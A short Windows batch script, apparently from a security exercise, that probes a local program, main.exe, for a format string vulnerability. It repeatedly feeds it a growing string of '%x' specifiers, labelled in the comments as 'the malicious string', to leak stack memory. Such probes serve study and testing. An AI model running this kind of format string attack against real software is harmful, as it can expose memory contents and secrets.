@echo off

::Setup the malicious string
set str=(%%s)

::Setup loop
set loopcount=100
:loop

::Put the string in a file (+ string for password)
echo.%str%> input.txt
echo 1>> input.txt

::Run the program with the input string (input.txt goes in scanf) 
echo %str%
main.exe < input.txt

::Append %x to the beginning of the string
set str=%%x%str%

::Line feed, loopcount++, end of loop
echo:
echo:
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop
:exitloop